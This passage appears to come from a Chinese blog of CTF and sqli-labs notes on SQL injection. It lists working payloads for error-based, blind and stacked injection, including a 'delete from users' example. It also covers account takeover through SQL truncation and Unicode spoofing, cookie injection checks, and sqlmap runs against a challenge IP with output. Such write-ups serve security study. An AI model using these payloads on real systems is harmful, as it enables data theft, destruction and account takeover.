有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来<br>若想详细了解，阔以参考这篇博客: <a href="https://blog.csdn.net/lixiangminghate/article/details/80466257">链接</a></p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><h4 id="利用limit-n-1"><a href="#利用limit-n-1" class="headerlink" title="利用limit n,1"></a>利用limit n,1</h4><p>有时候会限制输出的行数，这时往往会报错: Subquery returns more than 1 row<br>这时就要巧用limit，比如: </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>)<br>(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">2</span>,<span class="hljs-number">1</span>)<br>(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>)<br>.<br>.<br>.<br></code></pre></td></tr></table></figure><h2 id="floor-报错"><a href="#floor-报错" class="headerlink" title="floor()报错"></a>floor()报错</h2><p>eg: </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> count(*),concat((payload),floor(rand()*<span class="hljs-number">2</span>))<span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>搬运工，阔以看看这个<a href="https://blog.csdn.net/lixiangminghate/article/details/80466257">双查询报错原理</a><br>大致就是利用floor报错。<del>听君一席话，如听一席话</del></p><h2 id="updatexml-报错"><a href="#updatexml-报错" class="headerlink" title="updatexml()报错"></a>updatexml()报错</h2><p>eg: </p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and updatexml(<span class="hljs-number">1</span>,concat(&#x27;~&#x27;,(<span class="hljs-name">payload</span>)),<span class="hljs-number">1</span>)-- <br></code></pre></td></tr></table></figure><p>原理简单，不解释，继续搬运, <a href="https://www.cnblogs.com/remon535/p/12547932.html">updatexml()报错原理</a><br>concat时也阔以用’<del>‘等xml格式不支持的字符eg: concat(‘</del>‘,(payload),1) , 以~开头的东东8是xml语法，就会返回报错</p><h2 id="extractValue-报错"><a href="#extractValue-报错" class="headerlink" title="extractValue()报错"></a>extractValue()报错</h2><p>eg:</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">and</span> extractvalue(<span class="hljs-string">&#x27;shit&#x27;</span>,<span class="hljs-built_in">concat</span>(<span class="hljs-string">&#x27;~&#x27;</span>,payload))<span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><p>搬运。。。<a href="https://blog.csdn.net/zpy1998zpy/article/details/80631036">extractValue()报错原理</a><br>和updatexml()原理类似<br><img src="/images/sqli_labs/sqli_labs(5).png"><br>0hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh!!!!!!!!!!!!!!!!</p><h1 id="我超，到盲注了"><a href="#我超，到盲注了" class="headerlink" title="我超，到盲注了"></a>我超，到盲注了</h1><p>参考:<a href="https://blog.csdn.net/szlg510027010/article/details/107171100/">链接</a><br>盲注就是在注入过程中数据不能回显到前端页面，全靠猜(所以叫布尔)<br>而又因为全靠猜，所以得搓脚本</p><p>3种类型: 基于布尔、时间、报错的盲注</p><h2 id="大致说明"><a href="#大致说明" class="headerlink" title="大致说明"></a>大致说明</h2><p>基于时间: 注入，猜测是对是错，由时间来做抉择，如果是对，延迟几秒再显示页面，如果是错，就正常显示页面</p><p>基于布尔: 其实跟时间很像，只不过做裁决的不再是时间，而是返回的数据本身，比如，在sqli_labs第8关里，查ABC这一数据，问第一个字母的 ASCII 值是不是大于 100 ，如果正确，页面就会显示 you are in…，如果错误就什么都不显示</p><p>基于报错，通过一些函数特性报错得到需要的结果</p><h2 id="可能会用到的payload"><a href="#可能会用到的payload" class="headerlink" title="可能会用到的payload"></a>可能会用到的payload</h2><h3 id="基于时间"><a href="#基于时间" class="headerlink" title="基于时间"></a>基于时间</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">if</span>(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">0</span>)-- <br></code></pre></td></tr></table></figure><h3 id="基于报错"><a href="#基于报错" class="headerlink" title="基于报错"></a>基于报错</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),floor(rand()*<span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure><p>如果information_schema报错了，那就用: </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> !<span class="hljs-number">1</span>) <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(version(),floor(rand()*<span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure><p>如果rand被禁用了，可以使用用户变量来报错(用了一下，不明觉厉)：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">select</span> <span class="hljs-selector-tag">min</span>(<span class="hljs-variable">@a</span>:=<span class="hljs-number">1</span>) <span class="hljs-selector-tag">from</span> <span class="hljs-selector-tag">information_schema</span><span class="hljs-selector-class">.tables</span> <span class="hljs-selector-tag">group</span> <span class="hljs-selector-tag">by</span> <span class="hljs-selector-tag">concat</span>(password,<span class="hljs-variable">@a</span>:(<span class="hljs-variable">@a</span>+<span class="hljs-number">1</span>)%<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>还可以利用double数值类型超出范围，exp() 为以 e 为底的对数函数，mysql 版本需为 5.5.5 及其以上(用了一下，它的报错返回不明所以，先留着吧)</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a))<br></code></pre></td></tr></table></figure><p>利用 mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误<br>extractvalue(1,concat(0x7e,(select @@version),0x7e))<br>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</p><h3 id="大致操作流程"><a href="#大致操作流程" class="headerlink" title="大致操作流程"></a>大致操作流程</h3><p>首先判断你要查的东西的名字长度，比如数据库:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">and</span></span> (<span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">length</span></span>(<span class="hljs-title">database</span>())=<span class="hljs-number">8</span>) --</span><br></code></pre></td></tr></table></figure><p>然后通过ascii一个一个猜</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and (<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>(<span class="hljs-name">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=115) -- <br></code></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>sqli_labs第9关，无论后面的拼接语句正确与否，都返回同样的结果<br>这时就要用到时间盲注，通过sleep()判断是否正确<br>而前面判断单双引号及闭合时，也要通过and sleep(5)判断是否正确<br>简单举例，不赘述</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and if(<span class="hljs-name">database</span>()=&#x27;security&#x27;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)-- <br></code></pre></td></tr></table></figure><p>sleep()<br>benchmark(10000000,sha(1))  (约等于3s)</p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>eg:<br>buuctf: [强网杯 2019]随便注<br>堆叠注入很强大，可以用于执行任何SQL语句。<br>堆叠注入原理<br>就是用’;’把1个语句结束，再用继续输入其他的语句<br>eg:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">mysql&gt; </span><span class="language-bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span> =1;delete from <span class="hljs-built_in">users</span>;</span><br></code></pre></td></tr></table></figure><p>堆叠注入的局限性<br>堆叠注入不是任何情况下都能使用的(大多数时候，因为<del>API或数据库引擎的不支持</del>玄学问题，堆叠注入都无法实现)</p><h1 id="exp报错注入-5-5-mysql版本-5-6"><a href="#exp报错注入-5-5-mysql版本-5-6" class="headerlink" title="exp报错注入(5.5&lt; mysql版本&lt; 5.6)"></a>exp报错注入(5.5&lt; mysql版本&lt; 5.6)</h1><p>原理:<br>exp():计算e的x次方的函数，数字太大会产生溢出，在参数&gt;&#x3D;709时报错<br>然后在此条件上进行一些看8懂的奇怪操作，然后payload就有了</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">and</span> (exp(~(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (payload) a)))<br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span>(!x-~<span class="hljs-number">0</span>)<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span>(<span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">user</span>())x)a)</span>;<br></code></pre></td></tr></table></figure><p>eg:<br>select * fromusers where and (exp(~(select * from (payload) a)));<br>应用条件<br>5.5&lt; mysql版本&lt; 5.6  (啊这..)</p><h1 id="BIGINT溢出错误"><a href="#BIGINT溢出错误" class="headerlink" title="BIGINT溢出错误"></a>BIGINT溢出错误</h1><p>1个比较详细的<a href="https://cloud.tencent.com/developer/article/1521107">链接</a></p><p>原理:<br>大致就是最大的整数通过计算产生了溢出报错，有了报错，然后你懂的…<br>?id&#x3D;1’ union select (!(select * from (select user())x) - ~0),2,3–+</p><h1 id="NAME-CONST-报错注入"><a href="#NAME-CONST-报错注入" class="headerlink" title="NAME_CONST()报错注入"></a>NAME_CONST()报错注入</h1><p>原理:<br>mysql列名重复会导致报错,通过name_const制造一个列<br>payload:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">and <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> name_const(payload,<span class="hljs-number">0</span>)) a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> name_const(payload,<span class="hljs-number">0</span>)) b)c)<br></code></pre></td></tr></table></figure><h1 id="主键重复报错"><a href="#主键重复报错" class="headerlink" title="主键重复报错"></a>主键重复报错</h1><p>条件: version&lt; 5.5.53<br>select * from user where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</p><h1 id="几何函数报错"><a href="#几何函数报错" class="headerlink" title="几何函数报错"></a>几何函数报错</h1><p>5.7.17 &gt; version &gt; 5.5.47</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">geometrycollection</span>()</span><br><span class="hljs-variable">select</span> * <span class="hljs-variable">from</span> <span class="hljs-variable">user</span> <span class="hljs-variable">where</span> <span class="hljs-variable">id</span>=<span class="hljs-number">1</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title">geometrycollection</span>((<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span> *</span><br><span class="hljs-function"><span class="hljs-title">from</span>(<span class="hljs-variable">select</span> <span class="hljs-title">user</span>())<span class="hljs-variable">a</span>)<span class="hljs-variable">b</span>));</span><br><span class="hljs-function"><span class="hljs-title">multipoint</span>()</span><br><span class="hljs-variable">select</span> * <span class="hljs-variable">from</span> <span class="hljs-variable">test</span> <span class="hljs-variable">where</span> <span class="hljs-variable">id</span>=<span class="hljs-number">1</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title">multipoint</span>((<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span></span><br><span class="hljs-function"><span class="hljs-title">user</span>())<span class="hljs-variable">a</span>)<span class="hljs-variable">b</span>));</span><br><span class="hljs-function"><span class="hljs-title">polygon</span>()</span><br><span class="hljs-variable">select</span> * <span class="hljs-variable">from</span> <span class="hljs-variable">test</span> <span class="hljs-variable">where</span> <span class="hljs-variable">id</span>=<span class="hljs-number">1</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title">polygon</span>((<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span></span><br><span class="hljs-function"><span class="hljs-title">user</span>())<span class="hljs-variable">a</span>)<span class="hljs-variable">b</span>));</span><br><span class="hljs-function"><span class="hljs-title">multipolygon</span>()</span><br><span class="hljs-variable">select</span> * <span class="hljs-variable">from</span> <span class="hljs-variable">test</span> <span class="hljs-variable">where</span> <span class="hljs-variable">id</span>=<span class="hljs-number">1</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title">multipolygon</span>((<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span></span><br><span class="hljs-function"><span class="hljs-title">user</span>())<span class="hljs-variable">a</span>)<span class="hljs-variable">b</span>));</span><br><span class="hljs-function"><span class="hljs-title">linestring</span>()</span><br><span class="hljs-variable">select</span> * <span class="hljs-variable">from</span> <span class="hljs-variable">test</span> <span class="hljs-variable">where</span> <span class="hljs-variable">id</span>=<span class="hljs-number">1</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title">linestring</span>((<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span></span><br><span class="hljs-function"><span class="hljs-title">user</span>())<span class="hljs-variable">a</span>)<span class="hljs-variable">b</span>));</span><br><span class="hljs-function"><span class="hljs-title">multilinestring</span>()</span><br><span class="hljs-variable">select</span> * <span class="hljs-variable">from</span> <span class="hljs-variable">user</span> <span class="hljs-variable">where</span> <span class="hljs-variable">id</span>=<span class="hljs-number">1</span> <span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-function"><span class="hljs-title">multilinestring</span>((<span class="hljs-variable">select</span> * <span class="hljs-title">from</span>(<span class="hljs-variable">select</span> *</span><br><span class="hljs-function"><span class="hljs-title">from</span>(<span class="hljs-variable">select</span> <span class="hljs-title">user</span>())<span class="hljs-variable">a</span>)<span class="hljs-variable">b</span>));</span><br></code></pre></td></tr></table></figure><h1 id="sql约束攻击"><a href="#sql约束攻击" class="headerlink" title="sql约束攻击"></a>sql约束攻击</h1><p>原理:<br>sql中 insert 和 select 对⻓度和空格的处理⽅式差异造成的漏洞：select 语句对于参数后⾯空格的处理是删除，<br>insert 只是截取最⼤⻓度25的字符串，然后插⼊数据库。<br>假设⼀种情况，⽹⻚输⼊⽤户名，⾸先检查⽤户名是否在数据库中，如果不在就注册为新⽤户</p><ol><li>数据库中存在⼀个管理员 admin</li><li>我们输⼊⼀个⽤户名为 admin+20个空格+1</li><li>检查的时候调⽤ select 语句，空格被删除，剩下了 admin1 ，不在数据库中</li><li>调⽤ insert 注册 admin+20个空格+1 作为新的⽤户 ，这时该⽤户使⽤我们设置的密码</li><li>我们再输⼊ admin 进⾏查询，select 语句就会返回两条数据，⼀条是原本的 admin，另⼀条是被select截取了的admin，第⼆个admin可以匹配我们设置的密码，就可以登陆了</li></ol><p>新版本mysql已经修复 insert 时⾃动截取的问题</p><h1 id="Unicode欺骗-ᴬᴰᴹᴵᴺ"><a href="#Unicode欺骗-ᴬᴰᴹᴵᴺ" class="headerlink" title="Unicode欺骗(ᴬᴰᴹᴵᴺ)"></a>Unicode欺骗(ᴬᴰᴹᴵᴺ)</h1><p>[HCTF 2018]admin，这题简单到侮辱智商，但是wp里的方法还是有必要学习一下</p><p>进入页面，先是注册账户界面(sql注入&#x2F;xxe??)<br>然后注册后发现阔以上传文件(文件上传漏洞?)</p><p>先试试文件上传漏洞:<br>上传成功，但是连8了…..</p><p>试试在登陆界面用sql注入，以及在注册界面试试sql约束攻击<br>还没等试呢，然后在渗透中莫名其妙就出flag了…看了wp才知道，账号admin，密码就是123，在sql注入的时候误输输对了….</p><p>这道题的正常解法有2种</p><h2 id="unicode欺骗"><a href="#unicode欺骗" class="headerlink" title="unicode欺骗"></a>unicode欺骗</h2><p>Unicode欺骗指的是域名中的ASCII字符被替换为Unicode集中的相似字符</p><p>在这道题里，我们阔以注册1个ᴬᴰᴹᴵᴺ用户，然后后台的转化机制是这样的: ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin<br>然后就阔以用自己的密码登录这个admin辣<br>类似sql约束攻击，网上还有这个漏洞的进阶版: unicode漏洞，看完感觉很流批</p><h1 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h1><p>cookie是什么就8用说了，写在请求里，burp可以随意改，本质上和sql注入木得区别<br>要想了解Cookie注入的成因，必须要了解ASP脚本中的request对象。它被用于从用户那里__获取信息__。<br>Request对象的使用方法一般是这样的：request.[集合名称 ]（参数名称），比如获取从表单中提交的数据时可以这样写：request.form(“参数名称”)，但ASP中规定也可以省略集合名称，直接用这样的方式获取数据：request(“参数名称”)。<br>当使用这样的方式获取数据时，ASP规定是按QueryString、Form、Cookies、ServerVariables的顺序来获取数据的。这样，当我们使用request(“参数名称”)方式获取客户端提交的数据，并且没有对使用request.cookies(“参数名称”)方式提交的数据进行过滤时，Cookie注入就产生了。</p><h2 id="检测是否存在cookie注入"><a href="#检测是否存在cookie注入" class="headerlink" title="检测是否存在cookie注入"></a>检测是否存在cookie注入</h2><p>1.寻找形如“.asp?id&#x3D;xx”类的带参数的URL。   (eg: s&#x2F;hit.asp?id&#x3D;123)<br>2.去掉“id&#x3D;xx”查看页面显示是否正常，如果不正常，说明参数在数据传递中是直接起作用的。<br>3.清空浏览器地址栏，输入“javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx”));”，按Enter键后弹出一个对话框，内容是“id&#x3D;xx”，然后用原来的URL刷新页面，如果显示正常，说明应用使用Request(“id”)这种方式获取数据的。<br>4.重复上面的步骤，将常规SQL注入中的判断语句带入上面的URL：“javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx and 1&#x3D;1”));” “javascript:alert(document.cookie&#x3D;”id&#x3D;”+escape(“xx and 1&#x3D;2”));”。和常规SQL注入一样，如果分别返回正常和不正常页面，则说明该应用存在注入漏洞，并可以进行cookie注入<br>5.使用常规注入语句进行注入即可</p><h1 id="sqlmap笔记速查"><a href="#sqlmap笔记速查" class="headerlink" title="sqlmap笔记速查"></a>sqlmap笔记速查</h1><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">1</span>.GET参数注入<br>sqlmap -u <span class="hljs-string">&quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br><span class="hljs-number">2</span>.POST参数注入<br>sqlmap -u <span class="hljs-string">&quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1&quot;</span>  --data<span class="hljs-operator">=</span><span class="hljs-string">&quot;id=1&quot;</span><br></code></pre></td></tr></table></figure><h2 id="一次实战"><a href="#一次实战" class="headerlink" title="一次实战:"></a>一次实战:</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -u <span class="hljs-string">&quot;http://114.67.175.224:10497/&quot;</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">&#x27;id==1&#x27;</span><br><br>[16:53:34] [<span class="hljs-built_in">INFO</span>] resuming back-end DBMS <span class="hljs-string">&#x27;mysql&#x27;</span> <br>[16:53:34] [<span class="hljs-built_in">INFO</span>] testing<span class="hljs-built_in"> connection </span><span class="hljs-keyword">to</span> the target URL<br>web<span class="hljs-built_in"> server </span>operating system: Linux CentOS 6<br>web application technology: Apache 2.2.15, PHP 5.3.3<br>back-end DBMS: MySQL &gt;= 5.0.12<br>[16:53:34] [<span class="hljs-built_in">INFO</span>] fetching current database<br>current database: <span class="hljs-string">&#x27;skctf&#x27;</span>   # 查到数据库<br>[16:53:34] [<span class="hljs-built_in">INFO</span>] fetched data logged <span class="hljs-keyword">to</span> text files under <span class="hljs-string">&#x27;/home/tbmk/.local/share/sqlmap/output/114.67.175.224&#x27;</span><br><br>sqlmap -u <span class="hljs-string">&#x27;http://114.67.175.224:10497/&#x27;</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">&#x27;id=1&#x27;</span> --current-db   #查询DBMS(数据库管理系统当前数据库)<br><span class="hljs-comment"># 以及还可查询用户: --current-user</span><br><br>sqlmap -u <span class="hljs-string">&#x27;http://114.67.175.224:10497/&#x27;</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">&#x27;id=1&#x27;</span> -D <span class="hljs-string">&#x27;skctf&#x27;</span> --tables  #查skctf下的所有表<br>sqlmap -u <span class="hljs-string">&#x27;http://114.67.175.224:10497/&#x27;</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">&#x27;id=1&#x27;</span> -D <span class="hljs-string">&#x27;skctf&#x27;</span> -T <span class="hljs-string">&#x27;fl4g&#x27;</span> --columns #查columns<br>sqlmap -u <span class="hljs-string">&#x27;http://114.67.175.224:10497/&#x27;</span> <span class="hljs-attribute">--data</span>=<span class="hljs-string">&#x27;id=1&#x27;</span> -D <span class="hljs-string">&#x27;skctf&#x27;</span> -T <span class="hljs-string">&#x27;fl4g&#x27;</span> -C <span class="hljs-string">&#x27;skctf_flag&#x27;</span> --dump #查字段的内容<br><br></code></pre></td></tr></table></figure><h1 id="姿势-重命名-预处理语句"><a href="#姿势-重命名-预处理语句" class="headerlink" title="姿势: 重命名&amp;预处理语句"></a>姿势: 重命名&amp;预处理语句</h1><p>[强网杯 2019]随便注，简单的有回显注入<br>考察了堆叠注入，以及你8会的一些sql语法</p><p>然后禁止了一些关键词如select等，然后可以通过一些方法猜出数据库长度、名称，但事实上8用这么麻烦: </p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> databases;<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>可以得到2个表: words和1919810931114514<br>查看words表:</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">1</span>&#x27; show `<span class="hljs-built_in">words</span>`;<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>注意此处words为反勾号(事实上不加也可以)，关于勾号和反勾号再科普一下: linux下不区分，win下区分，勾号用来包含字符串，反勾号用来包含表、数据库、索引等<br>然后获得columns: id、data<br>再查看1919810931114514的columns(注意此处就需要加反勾号了): flag<br>然后就要想办法获取flag字段了</p><h2 id="姿势1-重命名"><a href="#姿势1-重命名" class="headerlink" title="姿势1-重命名"></a>姿势1-重命名</h2><p>未过滤alert、rename，可以进行表、列的修改<br>“因为这里有两张表，回显内容肯定是从word这张表中回显的”<br>那就把1919810931114514改名为words，再把flag改名为id，就阔以查询了<br>payload:</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">1</span>&#x27;<span class="hljs-comment">;RENAME TABLE `words` TO `words1`;  </span><br>RENAME TABLE `1919810931114514` TO `words`;<br>ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(<span class="hljs-number">100</span>) CHARACTER SET utf8 COLLATE utf8_general_ci <span class="hljs-literal">NOT</span> NULL<span class="hljs-comment">;</span><br><span class="hljs-title"># character: 字符集, 这段话的意思是:</span> 修改表的字段的字符集<br>show columns from words<span class="hljs-comment">;#</span><br></code></pre></td></tr></table></figure><p>此处第3个语句对column进行改名，如果使用普通的改名语句是8行的比如:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> `table_name` rename <span class="hljs-keyword">column</span> <span class="hljs-string">&#x27;name1&#x27;</span> <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;name2&#x27;</span><br></code></pre></td></tr></table></figure><p>涉及到对字符编码的修改，至于为啥要用utf-8，我也很迷….(那自然是因为用的普遍了)<br>但不修改为啥不行呢? 这是真的8懂</p><p>最后用 1’ or ‘1’&#x3D;’1 就阔以查询得flag了</p><h4 id="修改column的字符集"><a href="#修改column的字符集" class="headerlink" title="修改column的字符集"></a>修改column的字符集</h4><p>eg: 修改表的字段的字符集<br>[字符集 utf8，排序规则 utf8_general_ci]   (collate: 整理)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">user</span> CHANGE name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci;<br></code></pre></td></tr></table></figure><h2 id="姿势2-预处理语句-char-concat-绕过关键字屏蔽"><a href="#姿势2-预处理语句-char-concat-绕过关键字屏蔽" class="headerlink" title="姿势2-预处理语句 + char() + concat()绕过关键字屏蔽"></a>姿势2-预处理语句 + char() + concat()绕过关键字屏蔽</h2><p>首先扫盲，啥是预处理</p><h3 id="预处理语句使用方式"><a href="#预处理语句使用方式" class="headerlink" title="预处理语句使用方式"></a>预处理语句使用方式</h3><p>所谓预编译语句就是将SQL语句中的值(表名、列名等)用占位符替代，可以视为将 SQL 语句模板化或者说参数化</p><p>定义预处理语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">PREPARE</span> stmt_name <span class="hljs-keyword">FROM</span> 